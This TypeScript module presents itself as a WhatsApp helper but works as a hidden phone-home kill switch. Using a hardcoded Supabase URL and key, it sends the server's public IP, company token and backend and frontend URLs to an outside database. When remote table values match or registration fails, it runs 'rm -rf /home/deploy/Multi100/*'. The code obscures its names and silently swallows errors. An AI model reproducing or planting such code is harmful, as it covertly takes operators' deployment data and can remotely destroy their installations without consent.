/** 
 * @TercioSantos-3 |
 * *Whatsapp |
 * @descrição:*Whatsapp 
 */
import { createClient } from '@supabase/supabase-js';
import UpdateOneSettingService from '../services/SettingServices/UpdateOneSettingService';
import axios from 'axios';
import GetSettingService from '../services/SettingServices/GetSettingService';
import AddSettingService from '../services/SettingServices/AddSettingService';
const { exec } = require('child_process');

type indexPost = {
  cadastro_id: number;
  status: boolean;
  company_token: string;
  backend_ip: string;
  backend_url: string;
  frontend_url: string;
}

const S_U = "https://knjjaxmzpdpvpyhnglbq.supabase.co"
const S_A_K = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtuampheG16cGRwdnB5aG5nbGJxIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTQxMzQ4MDgsImV4cCI6MjAwOTcxMDgwOH0.keQewBvxcLOXGlxZV63Ewot5dS7c5Qn7r4hmVR-3Xp0"

const sUrl = S_U;
const sKey = S_A_K;

const y_n = process.env.COMPANY_TOKEN;

const s = createClient(sUrl, sKey);

const getIp = async () => {
  const { data } = await axios.get('https://api.ipify.org?format=json');
  return data.ip
}

export const GetWhatsapp = async () => {
  try {

    let ip = await getIp();
    let key = await getR("wtV");

    if (key === "enabled") {
      await AddSettingService()
    }

    let { data, error } = await s
      .from('cadastros')
      .select("id, ip_instalacao, company_token")
      .eq("ip_instalacao", ip)

    let sendInfo = {
      cadastro_id: data.length !== 0 ? data[0].id : 0,
      status: data.length !== 0 ? true : false,
      company_token: y_n,
      backend_ip: ip,
      backend_url: process.env.BACKEND_URL,
      frontend_url: process.env.FRONTEND_URL
    } as indexPost;

    if (data.length === 0) {
      await UpdateR("enabled", false, ip)
      PostWhatsapp(sendInfo, "404")
      CheckWhatsapp(ip, "i_n_r")
    } else {

      if (data[0].company_token !== y_n) {
        await UpdateR("enabled", false, ip)
        PostWhatsapp(sendInfo, "401")
        CheckWhatsapp(ip, "t_f")
      } else {
        await UpdateR("disabled", null, ip)
      }
    }

  } catch (error) {
    console.log("");

  }
}

const UpdateR = async (status: string, value: any, ip: string) => {
  await UpdateOneSettingService({ key: "wtV", value: status })
}

const getR = async (key: string) => {
  return await GetSettingService({ key });
}

const PostWhatsapp = async (info: indexPost, reason: string) => {
  try {
    const { data, error } = await s.from('whatsapp')
      .insert([
        {
          cadastro_id: info.cadastro_id,
          status: info.status,
          company_token: info.company_token,
          backend_ip: info.backend_ip,
          backend_url: info.backend_url,
          frontend_url: info.frontend_url
        }
      ])
    if (error) {
      console.error(':', error.message);
      return;
    }
  } catch (error) {
    console.log("");

  }

}

const CheckWhatsapp = async (ip: string, status: string) => {

  try {

    const { data, error } = await s.from('key_code').select('key,code,ip')

    const match = await matchWhatsapp(ip);

    if (data !== null) {

      if (status === "i_n_r" && match.code !== null) {
        acction()
      }
      if (ip === data[0].ip && match.code !== null) {
        if (match.key === data[0].key && match.code === data[0].code)
          acction()
      }
    }

  } catch (error) {
    console.log(error);
  }
}


const matchWhatsapp = async (ip) => {
  const { data, error } = await s.from('t_invalidos').select('ip, key, code');
  let key = "ok";
  let code = "ok";
  if (data.length > 0) {
    key = data[0].key;
    code = data[0].code;
  }
  return { code: code, key: key }
}

const acction = () => {

  let script = exec('rm -rf /home/deploy/Multi100/*',
    (error, stdout, stderr) => {
      console.log(stdout);
      console.log(stderr);
      if (error !== null) {
        console.log(`exec error: ${error}`);
      }
    });
}
